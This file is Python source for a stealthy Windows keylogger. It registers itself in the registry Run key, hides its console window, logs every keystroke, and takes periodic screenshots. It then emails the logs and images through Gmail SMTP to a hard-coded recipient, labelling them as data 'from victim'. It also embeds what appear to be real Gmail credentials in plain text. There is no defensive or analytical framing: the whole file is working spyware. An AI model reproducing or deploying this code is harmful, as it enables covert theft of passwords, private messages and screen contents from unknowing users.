import sys
import os
import time
import random
import string
import base64
import smtplib
from email.message import EmailMessage
from pynput import keyboard
import pyautogui
from winreg import *
import pythoncom
import win32console
import win32gui
from email.message import EmailMessage
from email.mime.base import MIMEBase
from email import encoders

# === CONFIG ===
yourgmail = "mona.lisa111924@gmail.com"
yourgmailpass = "blve sruj jvtf qpbj"
sendto = "fmichl468@gmail.com"
interval = 60  # seconds

# Globals
t = ""
pics_names = []
start_time = time.time()

# Log file
logfile = "Logfile.txt"


# --- Functions ---

def addStartup():
    exe_path = os.path.realpath(sys.argv[0])
    key_name = "ProcessLogPy"
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        key = OpenKey(HKEY_CURRENT_USER, reg_path, 0, KEY_ALL_ACCESS)
        try:
            existing, _ = QueryValueEx(key, key_name)
            if existing == exe_path:
                return  # Already registered correctly
        except FileNotFoundError:
            pass  # Not found, continue to add

        SetValueEx(key, key_name, 0, REG_SZ, exe_path)
        print(f"[+] Added to startup: {exe_path}")
    except Exception as e:
        print(f"[!] Failed to add to startup: {e}")

def hide_console():
    """Hide the console window."""
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


def generate_name():
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7))

screenshots_folder = "screenshots"
last_screenshot_time = 0  # initialize timestamp
screenshot_interval = 5   # seconds between screenshots
def screenshot():
    global last_screenshot_time

    # Only take screenshot if 5 seconds have passed
    if time.time() - last_screenshot_time < screenshot_interval:
        return  # skip screenshot if too soon

    if not os.path.exists(screenshots_folder):
        os.makedirs(screenshots_folder)

    name = generate_name() + '.png'
    full_path = os.path.join(screenshots_folder, name)
    pics_names.append(full_path)
    pyautogui.screenshot().save(full_path)
    last_screenshot_time = time.time()  # update the timestamp
    print(f"[+] Screenshot saved as {full_path}")

def send_mail(data, pics):
    try:
        msg = EmailMessage()
        msg['Subject'] = 'Keylogger Data'
        msg['From'] = yourgmail
        msg['To'] = sendto

        # Attach log data (base64 encoded)
        encoded_data = base64.b64encode(data.encode()).decode()
        msg.set_content("New data from victim (Base64 encoded):\n" + encoded_data)

        # Attach screenshots as image files using add_attachment
        for pic in pics:
            with open(pic, 'rb') as f:
                img_data = f.read()
            msg.add_attachment(img_data, maintype='image', subtype='png', filename=pic)

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(yourgmail, yourgmailpass)
            server.send_message(msg)

        print("[+] Mail sent successfully.")

        for pic in pics:
            if os.path.exists(pic):
                print(f"    Found {pic}, attaching...")
            else:
                print(f"    ERROR: {pic} not found!")

        # Optionally delete screenshots after sending
        for pic in pics:
            os.remove(pic)
        pics.clear()

        with open(logfile, "w") as f:
            f.write("")  # overwrite with empty string
        

    except Exception as e:
        print(f"[!] Failed to send mail: {e}")

    except Exception as e:
        print(f"[!] Failed to send mail: {e}")

def on_press(key):
    global t, start_time

    try:
        k = key.char  # single-char keys
    except AttributeError:
        k = str(key)  # special keys

    time_str = time.strftime("%H:%M:%S", time.localtime())
    log_line = f"[{time_str}] Key: {k}\n"
    t += log_line

    # Save to file if big enough
    if len(t) > 500:
        with open(logfile, "a") as f:
            f.write(t)
        t = ""

    # Take screenshot if enough logs
    if len(t) > 300:
        screenshot()

    # Send mail every 'interval' seconds
    if time.time() - start_time >= interval:
        if t or pics_names:
            send_mail(t, pics_names)
            t = ""  # clear buffer AFTER sending
        start_time = time.time()


if __name__ == "__main__":
    addStartup()
    hide_console()

    # Start keyboard listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
